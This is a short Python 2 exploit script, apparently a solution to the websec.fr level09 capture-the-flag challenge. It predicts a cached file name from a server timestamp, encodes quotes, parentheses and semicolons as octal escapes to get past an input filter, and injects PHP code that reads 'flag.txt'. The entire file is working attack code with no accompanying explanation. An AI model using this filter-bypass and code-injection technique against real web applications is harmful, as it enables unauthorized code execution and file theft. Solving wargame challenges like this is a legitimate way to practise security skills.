#!/usr/bin/python
# coding: utf-8

from requests import *
import commands
import hashlib

def getUploadedFile():
    time = int(commands.getoutput('./gettime.php')) + 1
    sha = hashlib.sha1(str(time)).hexdigest()

    return sha

def bypass(string):
    payload = ""
    for s in string:
        if s in ["'", '"', "(", ")", ";"]:
            payload += "\\" + oct(ord(s))
        else:
            payload += s

    return payload

def main():

    payload = bypass("echo file_get_contents('flag.txt');")
    print payload

    sha = getUploadedFile()
    url = "http://websec.fr/level09/index.php?cache_file=/tmp/{0}&submit=Submit&c={1}&file=flag.txt".format(sha, payload)

    r = get(url)
    print r.text

if __name__ == '__main__':
    main()
